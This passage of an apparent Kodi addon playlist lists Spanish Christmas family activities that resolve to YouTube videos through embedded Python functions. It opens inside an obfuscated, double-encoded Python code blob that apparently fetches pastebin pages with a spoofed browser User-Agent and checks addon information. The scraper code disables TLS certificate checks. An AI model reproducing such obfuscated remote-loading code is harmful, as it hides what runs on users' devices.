QmtCd0EyWkFnQVpBa0FObVFLQUhRSUFJTUJBbW9KQUZOOEJBQnFCd0JrREFCa0JRQnBBZ0JrQmdCa0J3QTJaQWdBWkFrQU5tUUtBSFFJQUlNQkFtb0pBRk5rQUFCVEtBMEFBQUJPYWYvLy8vOTBDd0FBQUdOeWFYTjBZV3hoZW5Wc2RBSUFBQUJwWkhNaEFBQUFhSFIwY0hNNkx5OXdZWE4wWldKcGJpNWpiMjB2Y21GM0wycFFXbUZDUjFsT2RBY0FBQUJvWldGa1pYSnpjMGdBQUFCTmIzcHBiR3hoTHpVdU1DQW9WMmx1Wkc5M2N5Qk9WQ0EyTGpNN0lGZFBWelkwT3lCeWRqbzFOUzR3S1NCSFpXTnJieTh5TURFd01ERXdNU0JHYVhKbFptOTRMelUxTGpCekNnQUFBRlZ6WlhJdFFXZGxiblJ6RkFBQUFHaDBkSEJ6T2k4dmNHRnpkR1ZpYVc0dVkyOXRkQWNBQUFCU1pXWmxjbVZ5ZEFZQUFBQjJaWEpwWm5sMEJRQUFBR1psYzNSaGN5RUFBQUJvZEhSd2N6b3ZMM0JoYzNSbFltbHVMbU52YlM5eVlYY3ZSalJvZG1KcGVIa29DZ0FBQUhRQ0FBQUFjbVYwQ0FBQUFISmxjWFZsYzNSemRBSUFBQUJ2YzNRRUFBQUFlR0p0WTNRSkFBQUFlR0p0WTJGa1pHOXVkQVVBQUFCQlpHUnZiblFNQUFBQVoyVjBRV1JrYjI1SmJtWnZkQU1BQUFCblpYUjBCUUFBQUVaaGJITmxkQVFBQUFCMFpYaDBLQWdBQUFCMEVRQUFBRTh3VHpCUE1EQXdUekF3TURCUE1FOHdkQkVBQUFCUE1FOVBUekF3VHpBd1R6QXdUekJQVDNRUkFBQUFUMDlQVHpCUE1EQlBUMDlQTUU4d1R6QlNCZ0FBQUZJSEFBQUFVZ2dBQUFCU0NRQUFBRklLQUFBQUtBQUFBQUFvQUFBQUFITUdBQUFBYzJOeWFYQjBkQXdBQUFCSFpYUk1VMUJ5YjBSaGRHRUJBQUFBY3d3QUFBQUFBVHdCR3dFcUFSc0JLZ0pPS0FFQUFBQlNFd0FBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/9b1JNDM.png</thumbnail>
<fanart>https://i.imgur.com/PAjbyGX.jpg</fanart>
<info>@addonfestaycristal</info>
</item>










<item>
<title>[B][COLOR red]DIA 05[/COLOR] [COLOR white]DECORAR[/COLOR][/B]</title>
<link>$doregex[resolve]</link>
<regex>
<name>resolve</name>
<expres><![CDATA[#$pyFunction
import urlresolver
def GetLSProData(page_data,Cookie_Jar,m):
 url = 'https://www.youtube.com/watch?v=LnbJ_Ag-odw'
 streamLink = urlresolver.resolve(url)
 return streamLink
]]></expres>
<page></page>
</regex>     
<thumbnail>https://i.imgur.com/k3qmI2h.png</thumbnail>
<fanart>https://i.imgur.com/PAjbyGX.jpg</fanart>
<info>@addonfestaycristal</info>
</item>


<item>
<title>[B][COLOR red]DIA 06[/COLOR] [COLOR white]COCINAR EN FAMILIA[/COLOR][/B]</title>
<link>$doregex[resolve]</link>
<regex>
<name>resolve</name>
<expres><![CDATA[#$pyFunction
import urlresolver
def GetLSProData(page_data,Cookie_Jar,m):
 url = 'https://www.youtube.com/watch?v=YNg2TfIyFNw&t=107s'
 streamLink = urlresolver.resolve(url)
 return streamLink
]]></expres>
<page></page>
</regex>  
<thumbnail>https://i.imgur.com/tmSTZ5m.png</thumbnail>
<fanart>https://i.imgur.com/PAjbyGX.jpg</fanart>
<info>@addonfestaycristal</info>
</item>



<item>
<title>[B][COLOR red]DIA 07[/COLOR] [COLOR white]ADIVINA LA PELÍCULA[/COLOR][/B]</title>
<link>$doregex[link_inteligente]</link>
<regex>
<name>link_inteligente</name>
<listrepeat><![CDATA[
<title>[COLOR red]+[/COLOR] [COLOR white][link_inteligente.param1][/COLOR]</title>
<link>$doregex[id]</link>
<thumbnail>https://i.ytimg.com/vi/[link_inteligente.param2]/hqdefault.jpg</thumbnail>
<fanart>https://i.imgur.com/PAjbyGX.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = 'https://www.youtube.com/watch?v=d5xgyM94cfY&list=PLfhEmscHOTKO2bLl3vFgeOyyrZIDHr9HT'
import re,requests,xbmc
def GetLSProData(page_data,Cookie_Jar,m,url=url):#cPrLItsLTfakl
 
  if '=' in url[:7]:
    if 'canal' in url[:7]:
        s2 = url + '2018Cristalazul'
        url = re.findall('(http.*?)2018Cristalazul', s2)[0]
        html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
        return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
    elif 'lista' in url[:7]:
        s2 = url + '2018Cristalazul'
        url = re.findall('(http.*?)2018Cristalazul', s2)[0]
        html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
        return re.findall('(?s)playlistPanelVideoRenderer".*?simpleText":"(.*?)".*?vi\/(.*?)\/', html)
    elif 'enlace' in url[:7]:
        s2 = url + '2018Cristalazul'
        url = re.findall('(http.*?)2018Cristalazul', s2)[0]
        titulo2 = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
        titulo = re.findall('title.":{."simpleText.":."(.*?)"', titulo2)[0]
        html = url + '2018CristalAzul'
        enlace = re.findall('v=(.*?)2018CristalAzul', html)[0]
        return [(titulo, enlace)]
    else:
        return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Error [/COLOR],[COLOR white]Enlace Mal puesto[/COLOR], 4000)")
  elif 'channel' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
  elif 'youtube.com/c/' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
  elif 'youtube.com/user' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
  elif 'list' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)playlistPanelVideoRenderer".*?simpleText":"(.*?)".*?vi\/(.*?)\/', html)
  else:
    titulo2 = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    titulo = re.findall('title.":{."simpleText.":."(.*?)"', titulo2)[0]
    html = url + '2018CristalAzul'
    enlace = re.findall('v=(.*?)2018CristalAzul', html)[0]
    return [(titulo, enlace)]
]]></expres>
<page></page>
</regex> 
<regex>
<name>id</name>
<expres><![CDATA[#$pyFunction
import resolveurl
def GetLSProData(page_data,Cookie_Jar,m):
  url = 'https://www.youtube.com/watch?v=[link_inteligente.param2]'
  return resolveurl.resolve(url)
]]></expres>
<page></page>
</regex>   
<thumbnail>https://i.imgur.com/Ewyxi4A.png</thumbnail>
<fanart>https://i.imgur.com/PAjbyGX.jpg</fanart>
<info>@addonfestaycristal</info>
</item>







<item>
<title>[B][COLOR red]DIA 08[/COLOR] [COLOR white]SESION DE CUENTOS[/COLOR][/B]</title>
<link>$doregex[link_inteligente]</link>
<regex>
<name>link_inteligente</name>
<listrepeat><![CDATA[
<title>[COLOR red]+[/COLOR] [COLOR white][link_inteligente.param1][/COLOR]</title>
<link>$doregex[id]</link>
<thumbnail>https://i.ytimg.com/vi/[link_inteligente.param2]/hqdefault.jpg</thumbnail>
<fanart>https://i.imgur.com/PAjbyGX.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = 'https://www.youtube.com/watch?v=DsEjRz6qoyo&list=PLR6vyZ1nBsHSMAWe6XtAtid5B67FpTGtb'
import re,requests,xbmc
def GetLSProData(page_data,Cookie_Jar,m,url=url):#cPrLItsLTfakl
 
  if '=' in url[:7]:
    if 'canal' in url[:7]:
        s2 = url + '2018Cristalazul'
        url = re.findall('(http.*?)2018Cristalazul', s2)[0]
        html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
        return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
    elif 'lista' in url[:7]:
        s2 = url + '2018Cristalazul'
        url = re.findall('(http.*?)2018Cristalazul', s2)[0]
        html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
        return re.findall('(?s)playlistPanelVideoRenderer".*?simpleText":"(.*?)".*?vi\/(.*?)\/', html)
    elif 'enlace' in url[:7]:
        s2 = url + '2018Cristalazul'
        url = re.findall('(http.*?)2018Cristalazul', s2)[0]
        titulo2 = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
        titulo = re.findall('title.":{."simpleText.":."(.*?)"', titulo2)[0]
        html = url + '2018CristalAzul'
        enlace = re.findall('v=(.*?)2018CristalAzul', html)[0]
        return [(titulo, enlace)]
    else:
        return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Error [/COLOR],[COLOR white]Enlace Mal puesto[/COLOR], 4000)")
  elif 'channel' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
  elif 'youtube.com/c/' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
  elif 'youtube.com/user' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
  elif 'list' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)playlistPanelVideoRenderer".*?simpleText":"(.*?)".*?vi\/(.*?)\/', html)
  else:
    titulo2 = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    titulo = re.findall('title.":{."simpleText.":."(.*?)"', titulo2)[0]
    html = url + '2018CristalAzul'
    enlace = re.findall('v=(.*?)2018CristalAzul', html)[0]
    return [(titulo, enlace)]
]]></expres>
<page></page>
</regex> 
<regex>
<name>id</name>
<expres><![CDATA[#$pyFunction
import resolveurl
def GetLSProData(page_data,Cookie_Jar,m):
  url = 'https://www.youtube.com/watch?v=[link_inteligente.param2]'
  return resolveurl.resolve(url)
]]></expres>
<page></page>
</regex> 
<thumbnail>https://i.imgur.com/IPjZwav.png</thumbnail>
<fanart>https://i.imgur.com/PAjbyGX.jpg</fanart>
<info>@addonfestaycristal</info>
</item>



<item>
<title>[B][COLOR red]DIA 09[/COLOR] [COLOR white]HACER POSTALES NAVIDEÑAS[/COLOR][/B]</title>
<link>$doregex[resolve]</link>
<regex>
<name>resolve</name>
<expres><![CDATA[#$pyFunction
import urlresolver
def GetLSProData(page_data,Cookie_Jar,m):
 url = 'https://www.youtube.com/watch?v=9U5bRtzPXUc'
 streamLink = urlresolver.resolve(url)
 return streamLink
]]></expres>
<page></page>
</regex>     
<thumbnail>https://i.imgur.com/2OCwnmw.png</thumbnail>
<fanart>https://i.imgur.com/PAjbyGX.jpg</fanart>
<info>@addonfestaycristal</info>
</item>





<item>
<title>[B][COLOR red]DIA 10[/COLOR] [COLOR white]SESIÓN DIBUJOS ANIMADOS[/COLOR][/B]</title>
<link>$doregex[link_inteligente]</link>
<regex>
<name>link_inteligente</name>
<listrepeat><![CDATA[
<title>[COLOR red]+[/COLOR] [COLOR white][link_inteligente.param1][/COLOR]</title>
<link>$doregex[id]</link>
<thumbnail>https://i.ytimg.com/vi/[link_inteligente.param2]/hqdefault.jpg</thumbnail>
<fanart>https://i.imgur.com/PAjbyGX.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = 'https://www.youtube.com/watch?v=8YWypj6iwXc&list=PL0jWOfkzaPFp8eFADQVdUFFMjpcHqAgVS'
import re,requests,xbmc
def GetLSProData(page_data,Cookie_Jar,m,url=url):#cPrLItsLTfakl
 
  if '=' in url[:7]:
    if 'canal' in url[:7]:
        s2 = url + '2018Cristalazul'
        url = re.findall('(http.*?)2018Cristalazul', s2)[0]
        html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
        return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
    elif 'lista' in url[:7]:
        s2 = url + '2018Cristalazul'
        url = re.findall('(http.*?)2018Cristalazul', s2)[0]
        html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
        return re.findall('(?s)playlistPanelVideoRenderer".*?simpleText":"(.*?)".*?vi\/(.*?)\/', html)
    elif 'enlace' in url[:7]:
        s2 = url + '2018Cristalazul'
        url = re.findall('(http.*?)2018Cristalazul', s2)[0]
        titulo2 = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
        titulo = re.findall('title.":{."simpleText.":."(.*?)"', titulo2)[0]
        html = url + '2018CristalAzul'
        enlace = re.findall('v=(.*?)2018CristalAzul', html)[0]
        return [(titulo, enlace)]
    else:
        return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Error [/COLOR],[COLOR white]Enlace Mal puesto[/COLOR], 4000)")
  elif 'channel' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
  elif 'youtube.com/c/' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
  elif 'youtube.com/user' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
  elif 'list' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)playlistPanelVideoRenderer".*?simpleText":"(.*?)".*?vi\/(.*?)\/', html)
  else:
    titulo2 = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    titulo = re.findall('title.":{."simpleText.":."(.*?)"', titulo2)[0]
    html = url + '2018CristalAzul'
    enlace = re.findall('v=(.*?)2018CristalAzul', html)[0]
    return [(titulo, enlace)]
]]></expres>
<page></page>
</regex> 
<regex>
<name>id</name>
<expres><![CDATA[#$pyFunction
import resolveurl
def GetLSProData(page_data,Cookie_Jar,m):
  url = 'https://www.youtube.com/watch?v=[link_inteligente.param2]'
  return resolveurl.resolve(url)
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/PY1Yed7.png</thumbnail>
<fanart>https://i.imgur.com/PAjbyGX.jpg</fanart>
<info>@addonfestaycristal</info>
</item>




<item>
<title>[B][COLOR red]DIA 11[/COLOR] [COLOR white]MAGIA[/COLOR][/B]</title>
<link>$doregex[resolve]</link>
<regex>
<name>resolve</name>
<expres><![CDATA[#$pyFunction
import urlresolver
def GetLSProData(page_data,Cookie_Jar,m):
 url = 'https://www.youtube.com/watch?v=a2uDdt7UR_E'
 streamLink = urlresolver.resolve(url)
 return streamLink
]]></expres>
<page></page>
</regex>     
<thumbnail>https://i.imgur.com/LJDFpkJ.png</thumbnail>
<fanart>https://i.imgur.com/PAjbyGX.jpg</fanart>
<info>@addonfestaycristal</info>
</item>






<item>
<title>[B][COLOR red]DIA 12[/COLOR] [COLOR white]SESIÓN RISOTERAPIA[/COLOR][/B]</title>
<link>$doregex[resolve]</link>
<regex>
<name>resolve</name>
<expres><![CDATA[#$pyFunction
import urlresolver
def GetLSProData(page_data,Cookie_Jar,m):
 url = 'https://www.youtube.com/watch?v=XTw5xfhIP3M'
 streamLink = urlresolver.resolve(url)
 return streamLink
]]></expres>
<page></page>
</regex>     
<thumbnail>https://i.imgur.com/UFoc5iN.png</thumbnail>
<fanart>https://i.imgur.com/PAjbyGX.jpg</fanart>
<info>@addonfestaycristal</info>
</item>




<item>
<title>[B][COLOR red]DIA 13[/COLOR] [COLOR white]KARAOKE[/COLOR][/B]</title>
<link>http://ignorame</link>
<thumbnail>https://i.imgur.com/cnq2XFQ.png</thumbnail>
<fanart>https://i.imgur.com/PAjbyGX.jpg</fanart>
<externallink>https://pastebin.com/raw/E29QAfWa</externallink>
</item>





<item>
<title>[B][COLOR red]DIA 9[/COLOR] [COLOR white]DIA SOLIDARIO[/COLOR][/B]</title>
<link>$doregex[resolve]</link>
<regex>
<name>resolve</name>
<expres><![CDATA[#$pyFunction
import urlresolver
def GetLSProData(page_data,Cookie_Jar,m):
 url = 'https://www.youtube.com/watch?v=2N9UKSsDfr0'
 streamLink = urlresolver.resolve(url)
 return streamLink
]]></expres>
<page></page>
</regex>     
<thumbnail>https://i.imgur.com/U9Qo3y9.png</thumbnail>
<fanart>https://i.imgur.com/PAjbyGX.jpg</fanart>
<info>@addonfestaycristal</info>
</item>



<item>
<title>[B][COLOR red]DIA 15[/COLOR] [COLOR white]JUST DANCE[/COLOR][/B]</title>
<link>$doregex[link_inteligente]</link>
<regex>
<name>link_inteligente</name>
<listrepeat><![CDATA[
<title>[COLOR red]+[/COLOR] [COLOR white][link_inteligente.param1][/COLOR]</title>
<link>$doregex[id]</link>
<thumbnail>https://i.ytimg.com/vi/[link_inteligente.param2]/hqdefault.jpg</thumbnail>
<fanart>https://i.imgur.com/PAjbyGX.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = 'https://www.youtube.com/watch?v=8jn_f5tVhR8&list=PL6KwSb1wGniwJJBf1K8mVPzi0NlG-Gp4C'
import re,requests,xbmc
def GetLSProData(page_data,Cookie_Jar,m,url=url):#cPrLItsLTfakl
 
  if '=' in url[:7]:
    if 'canal' in url[:7]:
        s2 = url + '2018Cristalazul'
        url = re.findall('(http.*?)2018Cristalazul', s2)[0]
        html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
        return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
    elif 'lista' in url[:7]:
        s2 = url + '2018Cristalazul'
        url = re.findall('(http.*?)2018Cristalazul', s2)[0]
        html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
        return re.findall('(?s)playlistPanelVideoRenderer".*?simpleText":"(.*?)".*?vi\/(.*?)\/', html)
    elif 'enlace' in url[:7]:
        s2 = url + '2018Cristalazul'
        url = re.findall('(http.*?)2018Cristalazul', s2)[0]
        titulo2 = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
        titulo = re.findall('title.":{."simpleText.":."(.*?)"', titulo2)[0]
        html = url + '2018CristalAzul'
        enlace = re.findall('v=(.*?)2018CristalAzul', html)[0]
        return [(titulo, enlace)]
    else:
        return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Error [/COLOR],[COLOR white]Enlace Mal puesto[/COLOR], 4000)")
  elif 'channel' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
  elif 'youtube.com/c/' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
  elif 'youtube.com/user' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
  elif 'list' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)playlistPanelVideoRenderer".*?simpleText":"(.*?)".*?vi\/(.*?)\/', html)
  else:
    titulo2 = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    titulo = re.findall('title.":{."simpleText.":."(.*?)"', titulo2)[0]
    html = url + '2018CristalAzul'
    enlace = re.findall('v=(.*?)2018CristalAzul', html)[0]
    return [(titulo, enlace)]
]]></expres>
<page></page>
</regex> 
<regex>
<name>id</name>
<expres><![CDATA[#$pyFunction
import resolveurl
def GetLSProData(page_data,Cookie_Jar,m):
  url = 'https://www.youtube.com/watch?v=[link_inteligente.param2]'
  return resolveurl.resolve(url)
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/v9BHQ8F.png</thumbnail>
<fanart>https://i.imgur.com/PAjbyGX.jpg</fanart>
<info>@addonfestaycristal</info>
</item>



<item>
<title>[B][COLOR red]DIA 16[/COLOR] [COLOR white]ADIVINANZAS[/COLOR][/B]</title>
<link>$doregex[resolve]</link>
<regex>
<name>resolve</name>
<expres><![CDATA[#$pyFunction
import urlresolver
def GetLSProData(page_data,Cookie_Jar,m):
 url = 'https://www.youtube.com/watch?v=BWhPzDIKxsg'
 streamLink = urlresolver.resolve(url)
 return streamLink
]]></expres>
<page></page>
</regex>     
<thumbnail>https://i.imgur.com/msXeUoR.png</thumbnail>
<fanart>https://i.imgur.com/PAjbyGX.jpg</fanart>
<info>@addonfestaycristal</info>
</item>


<item>
<title>[B][COLOR red]DIA 17[/COLOR] [COLOR white]CAPSULA DEL TIEMPO[/COLOR][/B]</title>
<link>$doregex[resolve]</link>
<regex>
<name>resolve</name>
<expres><![CDATA[#$pyFunction
import urlresolver
def GetLSProData(page_data,Cookie_Jar,m):
 url = 'https://www.youtube.com/watch?v=dlAvgWchb04'
 streamLink = urlresolver.resolve(url)
 return streamLink
]]></expres>
<page></page>
</regex>     
<thumbnail>https://i.imgur.com/8TaRloB.png</thumbnail>
<fanart>https://i.imgur.com/PAjbyGX.jpg</fanart>
<info>@addonfestaycristal</info>
</item>



<item>
<title>[B][COLOR red]DIA 18[/COLOR] [COLOR white]AMIGO INVISIBLE[/COLOR][/B]</title>
<link>$doregex[resolve]</link>
<regex>
<name>resolve</name>
<expres><![CDATA[#$pyFunction
import urlresolver
def GetLSProData(page_data,Cookie_Jar,m):
 url = 'https://www.youtube.com/watch?v=G09KEG1ZP8g'
 streamLink = urlresolver.resolve(url)
 return streamLink
]]></expres>
<page></page>
</regex>     
<thumbnail>https://i.imgur.com/agq14qw.png</thumbnail>
<fanart>https://i.imgur.com/PAjbyGX.jpg</fanart>
<info>@addonfestaycristal</info>
</item>



<item>
<title>[B][COLOR red]DIA 19[/COLOR] [COLOR white]HACER GALLETAS NAVIDEÑAS[/COLOR][/B]</title>
<link>$doregex[resolve]</link>
<regex>
<name>resolve</name>
<expres><![CDATA[#$pyFunction
import urlresolver
def GetLSProData(page_data,Cookie_Jar,m):
 url = 'https://www.youtube.com/watch?v=NZpbj9a2Bz4'
 streamLink = urlresolver.resolve(url)
 return streamLink
]]></expres>
<page></page>
</regex>     
<thumbnail>https://i.imgur.com/v2snCSm.png</thumbnail>
<fanart>https://i.imgur.com/PAjbyGX.jpg</fanart>
<info>@addonfestaycristal</info>
</item>


<item>
<title>[B][COLOR red]DIA 20[/COLOR] [COLOR white]CAJA DE LOS 5 SENTIDOS[/COLOR][/B]</title>
<link>$doregex[resolve]</link>
<regex>
<name>resolve</name>
<expres><![CDATA[#$pyFunction
import urlresolver
def GetLSProData(page_data,Cookie_Jar,m):
 url = 'https://www.youtube.com/watch?v=ii60yFiN2J8'
 streamLink = urlresolver.resolve(url)
 return streamLink
]]></expres>
<page></page>
</regex>     
<thumbnail>https://i.imgur.com/rEG2VVd.png</thumbnail>
<fanart>https://i.imgur.com/PAjbyGX.jpg</fanart>
<info>@addonfestaycristal</info>
</item>

<item>
<title>[B][COLOR red]DIA 21[/COLOR] [COLOR white]NAVIDADES DISNEY[/COLOR][/B]</title>
<link>$doregex[resolve]</link>
<regex>
<name>resolve</name>
<expres><![CDATA[#$pyFunction
import urlresolver
def GetLSProData(page_data,Cookie_Jar,m):
 url = 'https://www.youtube.com/watch?v=lT6iMGq_voY'
 streamLink = urlresolver.resolve(url)
 return streamLink
]]></expres>
<page></page>
</regex>     
<thumbnail>https://i.imgur.com/2ZQpChM.png</thumbnail>
<fanart>https://i.imgur.com/PAjbyGX.jpg</fanart>
<info>@addonfestaycristal</info>
</item>


<item>
<title>[B][COLOR red]DIA 22[/COLOR] [COLOR white]CIRCO DEL SOL[/COLOR][/B]</title>
<link>$doregex[resolve]</link>
<regex>
<name>resolve</name>
<expres><![CDATA[#$pyFunction
import urlresolver
def GetLSProData(page_data,Cookie_Jar,m):
 url = 'https://www.youtube.com/watch?v=nQ5eUJNXrMw'
 streamLink = urlresolver.resolve(url)
 return streamLink
]]></expres>
<page></page>
</regex>     
<thumbnail>https://i.imgur.com/4q1qjBN.png</thumbnail>
<fanart>https://i.imgur.com/PAjbyGX.jpg</fanart>
<info>@addonfestaycristal</info>
</item>

<item>
<title>[B][COLOR red]DIA 23[/COLOR] [COLOR white]SESIÓN ORIGAMI[/COLOR][/B]</title>
<link>$doregex[link_inteligente]</link>
<regex>
<name>link_inteligente</name>
<listrepeat><![CDATA[
<title>[COLOR red]+[/COLOR] [COLOR white][link_inteligente.param1][/COLOR]</title>
<link>$doregex[id]</link>
<thumbnail>https://i.ytimg.com/vi/[link_inteligente.param2]/hqdefault.jpg</thumbnail>
<fanart>https://i.imgur.com/PAjbyGX.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = 'https://www.youtube.com/watch?v=Kh1KXAOmVhU&list=PLWMYMD0Gnd9S6bkgTiuP2uL8lwQ5KX8S3'
import re,requests,xbmc
def GetLSProData(page_data,Cookie_Jar,m,url=url):#cPrLItsLTfakl
 
  if '=' in url[:7]:
    if 'canal' in url[:7]:
        s2 = url + '2018Cristalazul'
        url = re.findall('(http.*?)2018Cristalazul', s2)[0]
        html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
